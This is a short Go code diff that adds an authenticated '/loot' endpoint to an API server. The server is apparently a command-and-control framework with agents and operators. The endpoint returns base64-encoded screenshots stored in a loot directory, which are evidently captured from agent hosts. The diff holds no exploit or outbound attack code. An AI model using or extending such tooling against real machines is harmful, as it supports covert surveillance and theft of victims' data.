@@ -1,8 +1,10 @@
 package api
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"net/http"
+	"os"
 	"strconv"
 	"time"
 
@@ -233,6 +235,30 @@ func StartServer(port int) error {
 			return
 		}
 		c.JSON(http.StatusCreated, agent)
+	})
+
+	router.GET("/loot", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
+		lootDir := config.GetConfig().LootPath
+		screenshots, err := os.ReadDir(lootDir + "/screenshots")
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+
+		loot := map[string][]string{
+			"screenshots": {},
+		}
+		for _, file := range screenshots {
+			data, err := os.ReadFile(lootDir + "/screenshots/" + file.Name())
+			if err != nil {
+				c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+				return
+			}
+			base64Data := base64.StdEncoding.EncodeToString(data)
+			loot["screenshots"] = append(loot["screenshots"], string(base64Data))
+		}
+		c.JSON(http.StatusOK, loot)
+
 	})
 
 	sport := strconv.Itoa(port)
